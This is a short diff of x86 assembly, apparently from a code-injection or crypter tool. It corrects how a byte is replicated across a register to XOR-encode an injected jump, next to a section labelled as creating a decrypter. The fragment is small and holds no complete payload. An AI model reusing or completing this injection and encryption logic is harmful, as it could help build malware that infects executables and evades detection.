@@ -494,15 +494,13 @@ mov	esi, errorExit - toInject
 sub	eax, esi
 sub	eax, 05h ; Add 5 bytes for JMP
 ; Set same byte for all 4 bytes of EDX
-push	edx
-rol	edx, 4
+rol	edx, 8
 mov	dl, dh
-rol	edx, 4
+rol	edx, 8
 mov	dl, dh
-rol	edx, 4
+rol	edx, 8
 mov	dl, dh
 xor	eax, edx
-pop	edx
 stosd
 
 ; CREATING DECRYPTER
